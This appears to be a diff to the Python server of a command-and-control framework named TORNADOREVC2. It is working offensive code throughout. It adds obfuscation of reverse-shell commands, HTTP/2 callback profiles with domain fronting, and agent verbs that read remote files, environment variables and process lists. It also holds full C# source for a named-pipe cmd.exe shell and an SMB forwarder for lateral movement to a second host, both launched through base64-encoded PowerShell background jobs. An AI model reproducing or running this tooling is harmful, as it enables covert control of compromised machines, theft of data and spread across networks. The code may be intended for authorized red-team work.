+        )
+
+        # ECDSA command signer. Disabled silently when `cryptography`
+        # is not installed — signing is defence-in-depth, not required
+        # for the tool to function.
+        self.signer = None
+        if _ECDSA_AVAILABLE:
+            try:
+                self.signer = _CommandSigner()
+            except Exception as e:
+                print(f"[sign] disabled: {e}")
 
     def _build_payloads(self):
         return get_payloads(self.host, self.revshell_port, self.tls_port, self.mtls_port)
@@ -1002,6 +839,18 @@ class TORNADOREVC2:
         context.options |= ssl.OP_NO_COMPRESSION
         context.options |= ssl.OP_NO_RENEGOTIATION
         context.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
+        # Enable TLS session tickets — this allows clients to resume
+        # sessions across reconnects, matching the behaviour of real
+        # browsers. If the runtime does not expose OP_NO_TICKET,
+        # tickets are already on by default.
+        try:
+            context.options &= ~ssl.OP_NO_TICKET
+        except Exception:
+            pass
+        try:
+            context.num_tickets = 4
+        except Exception:
+            pass
         try:
             context.set_ecdh_curve("X25519")
         except ssl.SSLError:
@@ -1131,17 +980,57 @@ class TORNADOREVC2:
         return context
 
     def send_to_revshell(self, client_sock, cmd):
+        # Command obfuscation: wrap the payload when the session has an
+        # active obfuscator. The installer line and any pre-install probe
+        # are sent raw (obfuscator is None until the shell confirms).
+        info = self._client_info(client_sock)
+        if info is not None:
+            obf = info.get('obfuscator')
+            is_inproc = cmd.startswith('__')
+            if obf is not None and not is_inproc:
+                try:
+                    cmd = f"_r '{obf.encode(cmd)}'"
+                except Exception:
+                    pass
+
+        # ECDSA signing only applies to the socket that belongs to a
+        # signing-capable agent — currently the Windows HTTP/2 bridge.
+        # Sending signed envelopes to bash, cmd.exe, or a Linux agent
+        # would break the channel (they would treat the base64 signature
+        # as the command name).
+        http2_bridge = (info.get('transports') or {}).get('http2') if info else None
+        signed = (
+            info is not None
+            and info.get('signed_agent') is True
+            and http2_bridge is client_sock
+        )
+        if signed and self.signer is not None:
+            try:
+                env = self.signer.signed_envelope(cmd.encode('utf-8'))
+                wire = env + b'\n'
+            except Exception as e:
+                print(f"{self.colors['red']}[sign] signing failed: {e}"
+                      f"{self.colors['end']}")
+                return False
+        else:
+            wire = (cmd + "\n").encode()
+
         try:
-            client_sock.sendall((cmd + "\n").encode())
+            client_sock.sendall(wire)
         except Exception as exc:
-            # Secondary transports are torn down by the HTTP listener.
-            # Do not kill the bridge from here — a transient send error
-            # (EINTR, brief back-pressure, TLS rekey) must not tear down
-            # the session's only live transport.
             if self._is_secondary_transport(client_sock):
                 print(f"{self.colors['yellow']}[transport] send failed on "
                       f"secondary transport: {type(exc).__name__}: {exc}"
                       f"{self.colors['end']}")
+                # A transport whose sendall() has marked itself closed
+                # is not coming back. SMB has no reconnection logic, and
+                # HTTP/2 marks itself closed only on fatal send failures.
+                # Clean up so `transport <ID>` reflects reality.
+                if getattr(client_sock, 'closed', False):
+                    try:
+                        self.cleanup_client(client_sock)
+                    except Exception:
+                        pass
                 return False
             self.cleanup_client(client_sock)
             return False
@@ -1155,6 +1044,8 @@ class TORNADOREVC2:
                 label = 'shell'
             elif transports.get('http2') is client_sock:
                 label = 'http2'
+            elif transports.get('smb') is client_sock:
+                label = 'smb'
             else:
                 label = 'unknown'
             info['last_send_via'] = label
@@ -1163,7 +1054,7 @@ class TORNADOREVC2:
             except Exception:
                 info['last_send_addr'] = None
             logger = info.get('logger')
-            if logger and label in ('shell', 'http2'):
+            if logger and label in ('shell', 'http2', 'smb'):
                 try:
                     logger.log_event(
                         f"cmd[{label}] {cmd[:120]}{'…' if len(cmd) > 120 else ''}"
@@ -1177,6 +1068,9 @@ class TORNADOREVC2:
         info = self._client_info(client_sock)
         if not info:
             return False
+        if isinstance(info, Session):
+            return info.is_secondary(client_sock)
+        # Legacy dict path (kept until all sessions are Session instances)
         tr = info.get('transports') or {}
         if tr.get('http2') is client_sock:
             return True
@@ -1365,6 +1259,172 @@ class TORNADOREVC2:
         match = re.search(r'[a-fA-F0-9]{64}', payload)
         return match.group().lower() if match else None
 
+    def _inproc_call(self, client_sock, verb, arg='', timeout=5.0):
+        """
+        Send an in-process command (__rd / __ls / __env / __ps) to a
+        Linux HTTP/2 agent and return the single-line response.
+
+        Returns None if the active transport is not an HTTP/2 bridge to
+        a Linux agent, or if the response doesn't arrive in time. Callers
+        should fall back to the shell-based path in that case.
+        """
+        info = self._client_info(client_sock)
+        if info is None:
+            return None
+        if (info.get('type') or '').lower() != 'unix':
+            return None
+        transports = info.get('transports') or {}
+        if transports.get('http2') is not client_sock:
+            return None
+
+        cmd = f'{verb} {arg}'.rstrip()
+        try:
+            client_sock.sendall((cmd + '\n').encode())
+        except Exception:
+            return None
+
+        # Read one line. The agent appends a trailing \n.
+        data = b''
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            try:
+                r, _, _ = select.select([client_sock], [], [], 0.2)
+                if not r:
+                    continue
+                chunk = client_sock.recv(65536)
+                if not chunk:
+                    return None
+                data += chunk
+                if b'\n' in data:
+                    return data.split(b'\n', 1)[0]
+            except Exception:
+                return None
+        return None
+
+    def _inproc_read_file(self, client_sock, path, timeout=10.0):
+        """Read a remote file via the in-process agent. Returns bytes or None."""
+        import base64 as _b64
+        line = self._inproc_call(client_sock, '__rd', path, timeout=timeout)
+        if not line or line.startswith(b'error:'):
+            return None
+        try:
+            return _b64.b64decode(line, validate=False)
+        except Exception:
+            return None
+
+    def _inproc_list(self, client_sock, path='/', timeout=5.0):
+        """List a remote directory via the in-process agent. Returns list or None."""
+        line = self._inproc_call(client_sock, '__ls', path, timeout=timeout)
+        if not line or line.startswith(b'error:'):
+            return None
+        try:
+            return json.loads(line.decode('utf-8'))
+        except Exception:
+            return None
+
+    def _render_env(self, line):
+        """Format a __env reply as KEY=VALUE lines."""
+        try:
+            env = json.loads(line.decode('utf-8'))
+        except Exception:
+            return None
+        return ('\n'.join(f'{k}={v}' for k, v in env.items()) + '\n').encode('utf-8')
+
+    def _render_ps(self, line):
+        """Format a __ps reply as ps-like columnar text."""
+        try:
+            procs = json.loads(line.decode('utf-8'))
+        except Exception:
+            return None
+        lines = ['PID      COMMAND']
+        for p in procs:
+            lines.append(f"{p.get('pid', 0):<8} {p.get('cmd') or p.get('comm', '')}")
+        return ('\n'.join(lines) + '\n').encode('utf-8')
+
+    def _render_ls(self, entries):
+        """
+        Format a __ls reply as ls -l-like text.
+        Plugins that parse `ls -la` output should accept this.
+        """
+        lines = []
+        for e in entries:
+            name = e.get('name', '')
+            typ = e.get('type', 'unknown')
+            size = e.get('size', 0)
+            mode = e.get('mode', '0o644')
+            if typ == 'dir':
+                prefix = 'd'
+            elif typ == 'file':
+                prefix = '-'
+            else:
+                prefix = '?'
+            # mode is "0o0755" from oct() — strip the '0o' and take the
+            # last 9 bits.
+            try:
+                perm = int(mode, 8) & 0o777
+                perm_s = ''.join(
+                    c if (perm >> s) & 1 else '-'
+                    for c, s in zip('rwxrwxrwx', (8, 7, 6, 5, 4, 3, 2, 1, 0))
+                )
+            except Exception:
+                perm_s = 'rw-r--r--'
+            lines.append(f'{prefix}{perm_s} 1 user user {size:>8} {name}')
+        return ('\n'.join(lines) + '\n').encode('utf-8')
+
+    def run_command_smart(self, client_sock, cmd, timeout=5.0):
+        """
+        Execute a shell command, routing through the in-process agent
+        when the command matches a supported verb.
+
+        Returns (output_bytes, used_inproc). If used_inproc is False,
+        callers must fall through to the normal shell path — the
+        function has done nothing in that case.
+        """
+        info = self._client_info(client_sock)
+        match = _match_inproc(cmd, info, client_sock)
+        if match is None:
+            return None, False
+
+        verb, arg = match
+
+        if verb == '__rd':
+            data = self._inproc_read_file(client_sock, arg, timeout=timeout)
+            if data is None:
+                return None, False
+            return data, True
+
+        if verb == '__ls':
+            entries = self._inproc_list(client_sock, arg or '.', timeout=timeout)
+            if entries is None:
+                return None, False
+            return self._render_ls(entries), True
+
+        if verb == '__env':
+            line = self._inproc_call(client_sock, '__env', '', timeout=timeout)
+            if line is None or line.startswith(b'error:'):
+                return None, False
+            rendered = self._render_env(line)
+            if rendered is None:
+                return None, False
+            return rendered, True
+
+        if verb == '__ps':
+            line = self._inproc_call(client_sock, '__ps', '', timeout=timeout)
+            if line is None or line.startswith(b'error:'):
+                return None, False
+            rendered = self._render_ps(line)
+            if rendered is None:
+                return None, False
+            return rendered, True
+
+        if verb in ('__pwd', '__whoami', '__id', '__hostname', '__uname'):
+            line = self._inproc_call(client_sock, verb, '', timeout=timeout)
+            if line is None or line.startswith(b'error:'):
+                return None, False
+            return line + b'\n', True
+
+        return None, False
+
     def _run_marked(
         self, client_sock, unix_cmd, win_ps_script, shell_type, timeout=15.0,
         start_mark=None, end_mark=None, strip_ws=True,
@@ -1377,8 +1437,26 @@ class TORNADOREVC2:
         if shell_type == 'windows':
             if not self._send_win_ps(client_sock, win_ps_script):
                 return None
-        elif not self.send_to_revshell(client_sock, unix_cmd):
-            return None
+        else:
+            # Try the in-process route first. If the command is a
+            # single cat / ls / env / ps, we serve it without spawning
+            # a child. Otherwise fall through to the shell.
+            data, used_inproc = self.run_command_smart(client_sock, unix_cmd)
+            if used_inproc:
+                # The caller of _run_marked expects the *extracted*
+                # payload, not a marker-wrapped string — it will hand
+                # the return value to _parse_marked_int / _parse_marked_hash,
+                # both of which use regexes that would match digits in
+                # the marker itself. Reproduce _extract_marked's
+                # normalisation so behaviour is identical.
+                text = data.decode('utf-8', errors='replace')
+                if strip_ws:
+                    text = re.sub(r'[\r\n\t ]', '', text)
+                else:
+                    text = text.strip('\r\n\t ')
+                return text if text else ''
+            if not self.send_to_revshell(client_sock, unix_cmd):
+                return None
         output = self.recv_output(client_sock, timeout=timeout, until_marker=end_mark)
         payload = self._extract_marked(output, start_mark, end_mark, strip_ws)
         if payload is None and output and end_mark in output:
@@ -1415,7 +1493,7 @@ class TORNADOREVC2:
         t = transports.get(active)
         if t is not None:
             candidates.append(t)
-        for key in ('shell', 'http2'):
+        for key in ('shell', 'http2', 'smb'):
             t = transports.get(key)
             if t is not None and t not in candidates:
                 candidates.append(t)
@@ -1454,11 +1532,38 @@ class TORNADOREVC2:
             return
 
         # Register the bridge under the same info dict so lookups work.
-        info['transports']['http2'] = bridge
-        info['active_transport']    = 'http2'
-        info['h2_token']            = None
+        if isinstance(info, Session):
+            try:
+                info.attach_transport('http2', bridge)
+                info.activate('http2')
+            except ValueError as e:
+                print(f"{self.colors['yellow']}[H2] {e}{self.colors['end']}")
+                try:
+                    bridge.close()
+                except Exception:
+                    pass
+                return
+        else:
+            info['transports']['http2'] = bridge
+            info['active_transport']    = 'http2'
+        info['h2_token'] = None
         with self.client_lock:
             self.revshell_clients[bridge] = info
+
+        # ECDSA-signed commands only work against agents that carry a
+        # public key AND implement verification — currently only the
+        # Windows HTTP/2 C# agent. Linux and HTTP/1.1 agents pass
+        # commands straight through to their shell, so signing them
+        # would break the channel.
+        from .http2_transport import Http2SessionSocket as _H2Sock
+        if (
+            self.signer is not None
+            and (info.get('type') or '').lower() == 'windows'
+            and isinstance(bridge, _H2Sock)
+        ):
+            info['signed_agent'] = True
+        else:
+            info['signed_agent'] = False
 
         display = info['name'] if info.get('name') else f"#{info['id']}"
         print(
@@ -1470,18 +1575,739 @@ class TORNADOREVC2:
         if logger:
             logger.log_event(f"HTTP/2 transport attached from {addr[0]}:{addr[1]}")
 
-    def _http2_payload(self, url):
-        """Return the PowerShell source for the target-side HTTP/2 agent."""
-        return _HTTP2_AGENT_TEMPLATE.replace('__H2_URL__', url)
+        # Reinstall the command obfuscator on the agent's shell.
+        #
+        # The HTTP/2 agent spawns its own bash or PowerShell inside the
+        # agent process. That shell has never seen the `_r` installer
+        # that ran against the primary shell, so any subsequent
+        # obfuscated command would fail with `_r: command not found`.
+        #
+        # IMPORTANT: this runs on a background thread. We are called
+        # from inside the HTTP/2 listener's `with conn_lock:` block,
+        # and `bridge.sendall()` needs that same lock — calling it here
+        # would deadlock the listener thread against itself.
+        obf = info.get('obfuscator')
+        if obf is not None:
+            installer = (
+                _powershell_obfuscator_installer(obf.hex)
+                if (info.get('type') or '').lower() == 'windows'
+                else _unix_obfuscator_installer(obf.hex)
+            )
 
-    def _http2_payload_linux(self, host, port, token):
+            def _install_obfuscator(bridge=bridge, installer=installer):
+                # Small delay lets the listener thread release conn_lock
+                # and finish processing the RequestReceived event before
+                # we try to send our own DATA frame on the same stream.
+                time.sleep(0.4)
+                try:
+                    bridge.sendall((installer + '\n').encode())
+                    time.sleep(0.3)
+                    self.recv_output(bridge, timeout=0.5)
+                except Exception:
+                    pass
+
+            threading.Thread(
+                target=_install_obfuscator, daemon=True,
+            ).start()
+
+    def _h2_token_hmac(self, token):
+        """Return a hex HMAC over the token, using the handler's per-run key."""
+        import hmac as _hmac
+        return _hmac.new(
+            self._h2_hmac_secret, token.encode('ascii'), hashlib.sha256,
+        ).hexdigest()
+
+    def _h2_verify_token(self, token, presented):
+        """Constant-time HMAC compare for a presented token proof."""
+        import hmac as _hmac
+        expected = self._h2_token_hmac(token)
+        try:
+            return _hmac.compare_digest(expected, presented)
+        except Exception:
+            return False
+
+    def _build_h2_url(self, host, port, token, front_domain=None,
+                      front_port=None, profile=None):
+        """
+        Build the HTTP/2 callback URL the agent will dial. The path
+        portion comes from the malleable profile's `uri_pattern`.
+
+        `profile`, if provided, overrides the handler default for this
+        call — used by per-session profile selection in `http2switch`.
+        """
+        prof = profile or self.profile
+        proof = self._h2_token_hmac(token)
+        pattern = prof['http2'].get('uri_pattern') or '/c2/{token}?s={proof}'
+        path = pattern.replace('{token}', token).replace('{proof}', proof)
+        # Ensure the path starts with a slash (a profile author might
+        # forget, and URL parsing breaks without it).
+        if not path.startswith('/'):
+            path = '/' + path
+
+        if front_domain:
+            effective_port = front_port or 443
+            if effective_port == 443:
+                return f"https://{front_domain}{path}"
+            return f"https://{front_domain}:{effective_port}{path}"
+
+        return f"https://{host}:{port}{path}"
+
+    def list_profiles(self):
+        """Print the available profiles from the profile directory."""
+        names = _scan_profiles(self.profile_dir)
+        print(f"{self.colors['cyan']}[profile] Directory: "
+              f"{self.profile_dir}/{self.colors['end']}")
+        if not names:
+            print(f"  {self.colors['yellow']}(no *.json files found)"
+                  f"{self.colors['end']}")
+            return
+        for name in names:
+            print(f"  {self.colors['green']}{name}{self.colors['end']}")
+
+    def _load_profile_by_name(self, name):
+        """Load a named profile from the profile directory, or None."""
+        if not name:
+            return None
+        stem = name[:-5] if name.endswith('.json') else name
+        path = os.path.join(self.profile_dir, stem + '.json')
+        if not os.path.exists(path):
+            print(f"{self.colors['red']}[profile] {path} not found"
+                  f"{self.colors['end']}")
+            return None
+        return _load_malleable_profile(path)
+
+    def _prompt_profile_selection(self):
+        """
+        Interactive profile picker. Returns a name to load, or None
+        meaning "use the handler default with no override".
+        """
+        names = _scan_profiles(self.profile_dir)
+        if not names:
+            print(f"{self.colors['yellow']}[profile] No profiles in "
+                  f"{self.profile_dir}/ — using handler default"
+                  f"{self.colors['end']}")
+            return None
+        print(f"\n{self.colors['cyan']}[H2] Available profiles "
+              f"({self.profile_dir}/):{self.colors['end']}")
+        for i, name in enumerate(names, 1):
+            print(f"  {self.colors['yellow']}{i:>2}){self.colors['end']} {name}")
+        print(f"  {self.colors['yellow']} 0){self.colors['end']} "
+              f"handler default (no override)")
+        print(f"  {self.colors['yellow']} q){self.colors['end']} cancel")
+        try:
+            choice = input(f"{self.colors['green']}Select [0]: "
+                           f"{self.colors['end']}").strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            return None
+        # Return-value contract:
+        #   a string  → load that profile
+        #   False     → operator cancelled; abort the switch
+        #   None      → use the handler default (choice 0 or empty)
+        if choice == 'q':
+            return False
+        if choice == '' or choice == '0':
+            return None
+        try:
+            idx = int(choice)
+        except ValueError:
+            print(f"{self.colors['red']}[profile] Invalid choice"
+                  f"{self.colors['end']}")
+            return None
+        if 1 <= idx <= len(names):
+            return names[idx - 1]
+        print(f"{self.colors['red']}[profile] Out of range{self.colors['end']}")
+        return None
+
+    def _http2_payload(self, url, profile=None):
+        """Return the PowerShell source for the target-side HTTP/2 agent."""
+        prof = profile or self.profile
+        try:
+            kill_days = int(os.environ.get('TORNADO_KILL_DAYS', '30'))
+        except Exception:
+            kill_days = 30
+        kill_deadline = int(time.time()) + kill_days * 86400
+        ua = prof['http2'].get('user_agent') or ''
+        ua_cs = ua.replace('\\', '\\\\').replace('"', '\\"')
+
+        # Embed the ECDSA public key in the C# if the signer is active.
+        # Empty string leaves verification disabled.
+        if self.signer is not None:
+            # C# verbatim-ish literal — the PEM is base64 + dashes, no
+            # escaping needed, but escape just in case.
+            pub_cs = self.signer.public_pem.replace('\\', '\\\\').replace('"', '\\"')
+        else:
+            pub_cs = ''
+
+        return (
+            _HTTP2_AGENT_TEMPLATE
+            .replace('__H2_URL__', url)
+            .replace('__H2_KILL__', str(kill_deadline))
+            .replace('__H2_UA__', ua_cs)
+            .replace('__H2_SIGN_PUB__', pub_cs)
+        )
+
+    def _smb_payload(self, pipe_name):
+        """
+        Return the C# source for a target-side named-pipe server.
+
+        The server:
+          - Creates NamedPipeServerStream(pipe_name) with a permissive
+            DACL so any authenticated user can connect.
+          - Spawns cmd.exe with redirected stdio.
+          - Reads length-prefixed frames from the pipe, writes them to
+            the shell's stdin.
+          - Reads shell stdout/stderr, writes them back as length-prefixed
+            frames.
+
+        OPSEC: the pipe name is randomised by the caller. The C# is
+        compiled in memory via Add-Type — no file on disk.
+        """
+        return f'''
+using System;
+using System.IO;
+using System.IO.Pipes;
+using System.Diagnostics;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Security.AccessControl;
+using System.Security.Principal;
+
+public static class SmbShell {{
+    public static void Run(string pipeName) {{
+        // Explicit DACL: allow any authenticated SMB session to open the
+        // pipe. Without this, the default DACL only grants FullControl to
+        // the shell's user, and the handler — connecting as a different
+        // account — is rejected with STATUS_ACCESS_DENIED.
+        var security = new PipeSecurity();
+        security.AddAccessRule(new PipeAccessRule(
+            new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null),
+            PipeAccessRights.ReadWrite | PipeAccessRights.CreateNewInstance,
+            AccessControlType.Allow
+        ));
+
+        var server = new NamedPipeServerStream(
+            pipeName,
+            PipeDirection.InOut,
+            1,
+            PipeTransmissionMode.Byte,
+            PipeOptions.None,
+            0, 0,                    // in/out buffer sizes (0 = default)
+            security                 // DACL
+        );
+
+        // Wait for the handler to connect. Bounded so the pipe server
+        // does not linger forever when the operator falls back to the
+        // loopback channel after a failed SMB attempt.
+        if (!server.WaitForConnection(30000)) {{
+            server.Dispose();
+            return;
+        }}
+
+        var psi = new ProcessStartInfo {{
+            FileName = "cmd.exe",
+            UseShellExecute = false,
+            RedirectStandardInput  = true,
+            RedirectStandardOutput = true,
+            RedirectStandardError  = true,
+            CreateNoWindow = true,
+        }};
+        var proc = Process.Start(psi);
+
+        // Reader: pipe -> shell stdin
+        var t1 = Task.Run(() => {{
+            var hdr = new byte[4];
+            while (true) {{
+                if (!ReadExact(server, hdr, 4)) break;
+                int len = BitConverter.ToInt32(hdr, 0);
+                if (len <= 0 || len > 16 * 1024 * 1024) break;
+                var payload = new byte[len];
+                if (!ReadExact(server, payload, len)) break;
+                proc.StandardInput.BaseStream.Write(payload, 0, len);
+                proc.StandardInput.BaseStream.Flush();
+            }}
+        }});
+
+        // Writer: shell stdout -> pipe
+        var t2 = Task.Run(() => {{
+            var buf = new byte[65536];
+            int n;
+            while ((n = proc.StandardOutput.BaseStream.Read(buf, 0, buf.Length)) > 0) {{
+                SendFrame(server, buf, n);
+            }}
+        }});
+
+        // Writer: shell stderr -> pipe
+        var t3 = Task.Run(() => {{
+            var buf = new byte[65536];
+            int n;
+            while ((n = proc.StandardError.BaseStream.Read(buf, 0, buf.Length)) > 0) {{
+                SendFrame(server, buf, n);
+            }}
+        }});
+
+        Task.WaitAll(t1, t2, t3);
+    }}
+
+    static bool ReadExact(Stream s, byte[] buf, int n) {{
+        int off = 0;
+        while (off < n) {{
+            int r = s.Read(buf, off, n - off);
+            if (r <= 0) return false;
+            off += r;
+        }}
+        return true;
+    }}
+
+    static void SendFrame(Stream s, byte[] buf, int len) {{
+        var hdr = BitConverter.GetBytes(len);
+        s.Write(hdr, 0, 4);
+        s.Write(buf, 0, len);
+        s.Flush();
+    }}
+}}
+'''
+
+    def _smb_lateral_payload(self, b_host, b_pipe, a_pipe):
+        """
+        C# source for an SMB-pipe forwarder deployed on host A.
+
+        The forwarder:
+          - opens a pipe client to \\\\<b_host>\\pipe\\<b_pipe>
+          - opens a pipe server on A: \\\\.\\pipe\\<a_pipe>
+          - bridges the two, so the handler (which connects to A's
+            pipe via SMB) drives B's shell end-to-end.
+
+        Both pipes use the same length-prefixed framing as the primary
+        SMB transport, so no translation is needed.
+        """
+        return f'''
+using System;
+using System.IO;
+using System.IO.Pipes;
+using System.Threading;
+using System.Threading.Tasks;
+
+public static class SmbForwarder {{
+    public static void Run(string bHost, string bPipe, string aPipe) {{
+        // Client to B
+        var toB = new NamedPipeClientStream(
+            bHost, bPipe,
+            PipeDirection.InOut,
+            PipeOptions.None);
+        toB.Connect(15000);
+
+        // Server on A for the handler
+        var fromA = new NamedPipeServerStream(
+            aPipe,
+            PipeDirection.InOut,
+            1,
+            PipeTransmissionMode.Byte,
+            PipeOptions.None);
+        fromA.WaitForConnection();
+
+        var t1 = Task.Run(() => CopyFrames(toB, fromA));
+        var t2 = Task.Run(() => CopyFrames(fromA, toB));
+        Task.WaitAll(t1, t2);
+    }}
+
+    static void CopyFrames(Stream src, Stream dst) {{
+        var buf = new byte[65536];
+        int n;
+        while ((n = src.Read(buf, 0, buf.Length)) > 0) {{
+            try {{
+                dst.Write(buf, 0, n);
+                dst.Flush();
+            }} catch {{ return; }}
+        }}
+    }}
+}}
+'''
+
+    def smb_lateral(self, a_client_id, b_host, b_pipe=None,
+                    username='', password='', domain=''):
+        """
+        Open a lateral channel: session A bridges to host B's named pipe.
+
+        From the handler's point of view this is a new secondary
+        transport on session A. All commands sent through it execute on
+        B, not A — the operator's prompt and plugins don't need to know.
+        """
+        info = self._get_info_by_id(a_client_id)
+        if info is None:
+            print(f"{self.colors['red']}Session #{a_client_id} not found{self.colors['end']}")
+            return False
+
+        if (info.get('type') or '').lower() != 'windows':
+            print(f"{self.colors['red']}[LATERAL] session A must be a Windows target{self.colors['end']}")
+            return False
+
+        if not _SMB_AVAILABLE:
+            print(f"{self.colors['yellow']}[LATERAL] smb_transport unavailable: "
+                  f"{_SMB_IMPORT_ERROR or 'module missing'}{self.colors['end']}")
+            return False
+
+        if not b_pipe:
+            print(f"{self.colors['red']}[LATERAL] B's pipe name is required "
+                  f"(deploy a pipe server on B first, then pass its name)"
+                  f"{self.colors['end']}")
+            return False
+
+        a_pipe = 'fx' + secrets.token_hex(4)
+
+        # 1. Deliver the forwarder to A
+        payload = self._smb_lateral_payload(b_host, b_pipe, a_pipe)
+        script = (
+            "Add-Type -TypeDefinition @\"\n"
+            + payload
+            + "\n\"@ -Language CSharp\n"
+            + f"[SmbForwarder]::Run('{b_host}', '{b_pipe}', '{a_pipe}')"
+        )
+        encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
+        marker = 'M' + secrets.token_hex(6)
+        var = 'v' + secrets.token_hex(4)
+        launch = (
+            f"${var}=[Text.Encoding]::Unicode.GetString("
+            f"[Convert]::FromBase64String('{encoded}'));"
+            f"Start-Job -ScriptBlock ([ScriptBlock]::Create(${var})) | Out-Null;"
+            f"Remove-Variable {var} -EA 0; '{marker}'"
+        )
+        primary_a = info['sock']
+        shell_kind = info.get('win_shell') or 'cmd'
+        if shell_kind == 'powershell':
+            self.send_to_revshell(primary_a, launch)
+        else:
+            cmd = self._win_ps_cmd(launch)
+            if cmd:
+                self.send_to_revshell(primary_a, cmd)
+            else:
+                self._send_win_ps(primary_a, launch)
+
+        print(f"{self.colors['cyan']}[LATERAL] Forwarder deployed to "
+              f"#{a_client_id}; waiting for A's pipe (\\\\.\\pipe\\{a_pipe})"
+              f"{self.colors['end']}")
+
+        # 2. Connect to A's bridge pipe as an SMB client. The forwarder
+        #    needs a moment to compile and open the pipe.
+        target_host = info['addr'][0]
+        delays = (2.0, 3.0, 4.0, 5.0, 5.0, 5.0, 5.0, 5.0)
+        bridge = None
+        last_exc = None
+        for delay in delays:
+            time.sleep(delay)
+            try:
+                bridge = SmbPipeSessionSocket(
+                    target_host, a_pipe, username, password, domain,
+                )
+                bridge.connect(timeout=10.0)
+                break
+            except Exception as exc:
+                last_exc = exc
+                if bridge is not None:
+                    try:
+                        bridge.close()
+                    except Exception:
+                        pass
+                    bridge = None
+                if 'not found' in str(exc).lower():
+                    continue
+                break
+
+        if bridge is None:
+            print(f"{self.colors['red']}[LATERAL] could not attach to A's "
+                  f"forwarder pipe: {last_exc}{self.colors['end']}")
+            return False
+
+        # 3. Register as a *new* session keyed to B, but piggybacking on
+        #    A's info dict so the transport abstraction works.
+        #    We tag it so `status` can show "via #A".
+        bridge_info = {
+            'sock': bridge,
+            'addr': (b_host, 445),
+            'direction': 'lateral',
+            'type': 'windows',
+            'id': None,
+            'name': f"lateral->{b_host}",
+            'tls': False,
+            'mtls': False,
+            'pty': False,
+            'init': False,
+            'sysinfo': None,
+            'logger': info.get('logger'),
+            'fingerprint': None,
+            'connect_count': 1,
+            'reconnected': False,
+            'transports': {'shell': bridge, 'http2': None, 'smb': None},
+            'active_transport': 'shell',
+            'h2_token': None,
+            'obfuscator': None,
+            'lateral_via': a_client_id,
+        }
+        with self.client_lock:
+            self.revshell_clients[bridge] = bridge_info
+            # Assign a new session id
+            self.client_counter += 1
+            bridge_info['id'] = self.client_counter
+        # Remember A's primary socket so cleanup_client can kill the
+        # forwarder job when this lateral session is torn down.
+        bridge_info['_lateral_a_sock'] = primary_a
+
+        print(f"{self.colors['green']}[LATERAL] New session #{bridge_info['id']} "
+              f"on {b_host} via #{a_client_id} — switch {bridge_info['id']}"
+              f"{self.colors['end']}")
+        return True
+
+    def _deliver_smb_agent(self, client_sock, pipe_name, shell_kind):
+        """
+        Deliver the C# named-pipe server to a Windows target and launch it
+        in a detached background job.
+
+        Returns True if the launch command was sent.
+        """
+        csharp = self._smb_payload(pipe_name)
+
+        # Wrap in a script that compiles via Add-Type and starts the server
+        # in a background runspace so the shell returns immediately.
+        script = (
+            "Add-Type -TypeDefinition @\"\n"
+            + csharp
+            + "\n\"@ -Language CSharp\n"
+            + f"[SmbShell]::Run('{pipe_name}')"
+        )
+
+        # The C# payload is a here-string and contains many double
+        # quotes; naive quote-escaping breaks it. Encode the entire
+        # script as UTF-16LE base64 and let PowerShell's
+        # [ScriptBlock]::Create handle the dequoting — no here-string
+        # rewriting, no add-type corruption.
+        encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
+
+        # Short launcher: reconstruct the scriptblock from base64, then
+        # run it in a detached background job so the shell is freed.
+        marker = 'M' + secrets.token_hex(6)
+        varname = 'v' + secrets.token_hex(4)
+        launch = (
+            f"${varname}=[Text.Encoding]::Unicode.GetString("
+            f"[Convert]::FromBase64String('{encoded}'));"
+            f"Start-Job -ScriptBlock ([ScriptBlock]::Create(${varname})) | Out-Null;"
+            f"Remove-Variable {varname} -EA 0; '{marker}'"
+        )
+
+        if shell_kind == 'powershell':
+            return self.send_to_revshell(client_sock, launch)
+
+        # cmd.exe: base64 the whole launch command too.
+        cmd = self._win_ps_cmd(launch)
+        if cmd:
+            return self.send_to_revshell(client_sock, cmd)
+
+        return self._send_win_ps(client_sock, launch)
+
+    def smb_switch(self, client_id, pipe_name=None,
+                   username='', password='', domain=''):
+        """
+        Deploy an SMB named-pipe server on a Windows target and attach the
+        handler as an SMB client.
+
+        If pipe_name is None, a randomised name is chosen.
+        """
+        info = self._get_info_by_id(client_id)
+
+        if info is None:
+            print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
+            return False
+
+        if (info.get('type') or '').lower() != 'windows':
+            print(f"{self.colors['red']}[SMB] SMB named pipes require a Windows target{self.colors['end']}")
+            return False
+
+        if not _SMB_AVAILABLE:
+            print(f"{self.colors['yellow']}[SMB] smb_transport unavailable "
+                  f"({_SMB_IMPORT_ERROR or 'module missing'}) — using the "
+                  f"same-host secondary channel{self.colors['end']}")
+            return self._smb_switch_loopback(client_id, pipe_name)
+
+        # Two backends, one command:
+        #
+        #   * --user / --pass supplied  → explicit credentials for the
+        #     network SMB session.
+        #
+        #   * no credentials            → use the handler's *current* logon
+        #     context. On a Windows handler, smbprotocol's SSPI path uses
+        #     the operator's token automatically; on a Linux handler with
+        #     smbprotocol[kerberos] and a valid TGT, the same happens over
+        #     GSSAPI. This is the "net use without credentials" behaviour.
+        #
+        # If the SSO attempt fails with an auth error, fall back to the
+        # same-host loopback channel (HTTP/2). The fallback is chosen only
+        # when the SMB path is genuinely unavailable, not pre-emptively.
+        use_sso = (not username and not password)
+
+        if info['transports'].get('smb') is not None:
+            print(f"{self.colors['yellow']}[SMB] SMB transport already active on "
+                  f"#{client_id}{self.colors['end']}")
+            return False
+
+        if not pipe_name:
+            pipe_name = 'svc' + secrets.token_hex(4)
+
+        primary = info['sock']
+        shell_kind = info.get('win_shell') or 'cmd'
+
+        print(f"{self.colors['cyan']}[SMB] Deploying named-pipe server "
+              f"(\\\\.\\pipe\\{pipe_name}) on #{client_id}{self.colors['end']}")
+
+        if not self._deliver_smb_agent(primary, pipe_name, shell_kind):
+            print(f"{self.colors['red']}[SMB] Failed to deliver agent{self.colors['end']}")
+            return False
+
+        # The pipe server is created by a detached PowerShell job that
+        # has to compile the C# via Add-Type before it opens the pipe.
+        # That can take several seconds on a cold .NET runtime, so we
+        # retry the SMB open with backoff instead of a single fixed
+        # sleep.
+        target_host = info['addr'][0]
